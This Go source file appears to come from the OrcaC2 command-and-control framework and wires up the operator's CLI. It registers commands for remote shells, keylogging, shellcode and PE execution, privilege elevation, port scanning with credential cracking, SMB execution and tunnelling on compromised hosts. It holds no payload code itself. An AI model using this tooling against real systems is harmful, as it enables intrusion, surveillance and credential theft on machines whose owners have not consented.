package controller

import (
	"Orca_Master/cli/cmdopt/listopt"
	"Orca_Master/cli/cmdopt/sshopt"
	"Orca_Master/define/config"
	"github.com/desertbit/grumble"
	"github.com/fatih/color"
	"strings"
)

var (
	App            *grumble.App       //终端模块
	Uname          = ""               //登录用户名
	HostLists      []listopt.HostList //主机列表
	SelectId       = -1               //选中主机id
	SelectClientId string             //选中主机ClientId
	SelectIp       string             //选中主机Ip
	SelectVer      string             //选中主机版本
	InitPrompt     string
)

func init() {
	// 初始化命令行界面
	App = grumble.New(&grumble.Config{
		Name:        "OrcaC2",
		Description: "OrcaC2 command line tool",
		HistoryFile: ".orca-history",
		PromptColor: color.New(color.FgGreen),
		Flags: func(f *grumble.Flags) {
			logo := config.Logo
			color.Green("OrcaC2 Master " + config.Version)
			color.Green(logo)
			f.String("H", "host", "127.0.0.1:6000", "host of TeamServer IP:Port addresses")
			f.String("u", "username", "", "enter username to login to the TeamServer")
			f.String("p", "password", "", "enter password to login to the TeamServer")
			sshopt.InitSshOption()
		},
	})
	App.AddCommand(listCmd)
	App.AddCommand(selectCmd)
	App.AddCommand(shellCmd)
	App.AddCommand(fileCmd)
	App.AddCommand(processCmd)
	App.AddCommand(screenCmd)
	App.AddCommand(keyloggerCmd)
	App.AddCommand(assemblyCmd)
	App.AddCommand(ptyCmd)
	App.AddCommand(getAdminCmd)
	App.AddCommand(closeClientCmd)
	App.AddCommand(execCmd)
	App.AddCommand(infoCmd)
	App.AddCommand(proxyCmd)
	App.AddCommand(sshCmd)
	App.AddCommand(portCmd)
	App.AddCommand(smbCmd)
	App.AddCommand(generateCmd)
	fileCmd.AddCommand(fileUploadCmd)
	fileCmd.AddCommand(fileDownloadCmd)
	processCmd.AddCommand(processListCmd)
	processCmd.AddCommand(processKillCmd)
	screenCmd.AddCommand(screenShotCmd)
	screenCmd.AddCommand(screenStreamCmd)
	assemblyCmd.AddCommand(assemblyLoadCmd)
	assemblyCmd.AddCommand(assemblyListCmd)
	assemblyCmd.AddCommand(assemblyInvokeCmd)
	assemblyCmd.AddCommand(assemblyClearCmd)
	execCmd.AddCommand(execShellcodeCmd)
	execCmd.AddCommand(execPECmd)
	proxyCmd.AddCommand(proxyServerCmd)
	proxyCmd.AddCommand(proxyClientCmd)
	proxyServerCmd.AddCommand(proxyServerStartCmd)
	proxyServerCmd.AddCommand(proxyServerListCmd)
	proxyServerCmd.AddCommand(proxyServerCloseCmd)
	proxyClientCmd.AddCommand(proxyClientStartCmd)
	proxyClientCmd.AddCommand(proxyClientListCmd)
	proxyClientCmd.AddCommand(proxyClientCloseCmd)
	sshCmd.AddCommand(sshSetCmd)
	sshCmd.AddCommand(sshShowCmd)
	sshCmd.AddCommand(sshRunCmd)
	sshCmd.AddCommand(sshUploadCmd)
	sshCmd.AddCommand(sshDownloadCmd)
	sshCmd.AddCommand(sshTunnelCmd)
	sshTunnelCmd.AddCommand(sshTunnelStartCmd)
	sshTunnelCmd.AddCommand(sshTunnelListCmd)
	sshTunnelCmd.AddCommand(sshTunnelCloseCmd)
	portCmd.AddCommand(portScanCmd)
	portCmd.AddCommand(portCrackCmd)
	smbCmd.AddCommand(smbSetCmd)
	smbCmd.AddCommand(smbShowCmd)
	smbCmd.AddCommand(smbUploadCmd)
	smbCmd.AddCommand(smbExecCmd)
	RemoveCommand()
}

func AddCommand() {
	App.Commands().Add(shellCmd)
	App.Commands().Add(fileCmd)
	App.Commands().Add(processCmd)
	App.Commands().Add(backCmd)
	App.Commands().Add(closeClientCmd)
	App.Commands().Add(infoCmd)
	App.Commands().Add(smbCmd)

	if SelectVer[:7] == "windows" {
		App.Commands().Add(screenCmd)
		App.Commands().Add(keyloggerCmd)
		App.Commands().Add(assemblyCmd)
		App.Commands().Add(execCmd)
		App.Commands().Add(getAdminCmd)
	}
	if SelectVer[:5] == "linux" {
		App.Commands().Add(ptyCmd)
	}
}

func RemoveCommand() {
	App.Commands().Remove("shell")
	App.Commands().Remove("file")
	App.Commands().Remove("process")
	App.Commands().Remove("screen")
	App.Commands().Remove("keylogger")
	App.Commands().Remove("assembly")
	App.Commands().Remove("pty")
	App.Commands().Remove("back")
	App.Commands().Remove("getadmin")
	App.Commands().Remove("exec")
	App.Commands().Remove("close")
	App.Commands().Remove("info")
	App.Commands().Remove("smb")
}

func filterStringWithPrefix(strs []string, prefix string) []string {
	var result []string
	for _, s := range strs {
		if strings.HasPrefix(s, prefix) {
			result = append(result, s)
		}
	}
	return result
}
